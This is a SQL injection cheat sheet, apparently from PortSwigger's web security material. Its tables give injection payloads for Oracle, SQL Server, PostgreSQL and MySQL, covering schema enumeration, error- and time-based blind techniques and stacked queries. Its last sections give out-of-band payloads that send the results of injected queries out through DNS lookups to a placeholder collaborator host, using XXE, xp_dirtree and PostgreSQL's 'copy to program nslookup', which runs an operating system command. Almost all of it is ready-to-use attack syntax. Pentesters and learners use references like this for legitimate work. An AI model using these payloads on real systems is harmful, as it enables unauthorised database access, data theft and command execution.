SQL injection cheat sheet
=========================

This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

String concatenation
--------------------

You can concatenate together multiple strings to make a single string.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>'foo'||'bar'</td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>'foo'+'bar'</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>'foo'||'bar'</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>'foo' 'bar' [Note the space between the two strings]
        <br> CONCAT('foo','bar')</td>
</tr>
</table>  

Substring
---------

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SUBSTR('foobar', 4, 2)</td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>SUBSTR('foobar', 4, 2)</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>SUBSTR('foobar', 4, 2)</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SUBSTR('foobar', 4, 2)</td>
</tr>
</table>

Comments
--------

You can use comments to truncate a query and remove the portion of the original query that follows your input.

<table>
<tr>
    <td><strong>Oracle</td>
    <td> 	--comment</td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td> 	--comment
           <br> /*comment*/</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td> 	--comment
           <br> /*comment*/</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td> 	#comment
    <br>    -- comment [Note the space after the double dash]
    <br>    /*comment*/</td>
</tr>
</table>

Database version
----------------

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SELECT banner FROM v$version
    <br>    SELECT version FROM v$instance</td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>SELECT @@version</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>SELECT version()</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SELECT @@version </td>
</tr>
</table>

Database contents
-----------------

You can list the tables that exist in the database, and the columns that those tables contain.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SELECT * FROM all_tables
    <br>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>SELECT * FROM information_schema.tables
    <br> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>SELECT * FROM information_schema.tables
    <br> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SELECT * FROM information_schema.tables
    <br> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' </td>
</tr>
</table>

Conditional errors
------------------

You can test a single boolean condition and trigger a database error if the condition is true.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') </td>
</tr>
</table>

Batched (or stacked) queries
----------------------------

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>Does not support batched queries. </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>QUERY-1-HERE; QUERY-2-HERE</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>QUERY-1-HERE; QUERY-2-HERE</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>QUERY-1-HERE; QUERY-2-HERE</td>
</tr>
</table>

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

Time delays
-----------

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>dbms_pipe.receive_message(('a'),10) </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>WAITFOR DELAY '0:0:10'</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>SELECT pg_sleep(10)</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SELECT SLEEP(10)</td>
</tr>
</table>

Conditional time delays
-----------------------

You can test a single boolean condition and trigger a time delay if the condition is true.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</td>
</tr>
</table>

DNS lookup
----------

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: <br>
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
<br>
The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
 </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>The following techniques work on Windows only: <br>
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</td>
</tr>
</table>

DNS lookup with data exfiltration
---------------------------------

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

<table>
<tr>
    <td><strong>Oracle</td>
    <td>SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
 </td>
</tr>
<tr>
    <td><strong>Microsoft</td>
    <td>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</td>
</tr>
<tr>
    <td><strong>PostgreSQL</td>
    <td>
 create OR replace function f() returns void as $$<br><br>                    declare c text;<br><br>                    declare p text;<br><br>                    begin<br><br>                    SELECT into p (SELECT YOUR-QUERY-HERE);<br><br>                    c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-COLLABORATOR-SUBDOMAIN''';<br><br>                    execute c;<br><br>                    END;<br><br>                    $$ language plpgsql security definer;<br><br>                    SELECT f(); 	</td>
</tr>
<tr>
    <td><strong>MySQL</td>
    <td>The following technique works on Windows only: <br>
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</td>
</tr>
</table>